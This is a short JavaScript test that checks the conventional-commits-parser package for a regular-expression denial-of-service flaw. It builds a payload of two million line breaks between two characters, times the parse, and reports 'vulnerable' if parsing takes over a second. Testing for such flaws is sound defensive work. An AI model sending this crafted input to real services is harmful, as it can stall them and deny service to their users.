// test("ReDos in conventional-commits-parser", () => {
  const measureTime = require("../utils").measureTime;
  const conventionalCommitsParser = require("conventional-commits-parser");
  let payload = "b" + "\r\n".repeat(2000000) + "b";
  let t = measureTime(function () {
    conventionalCommitsParser(payload);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
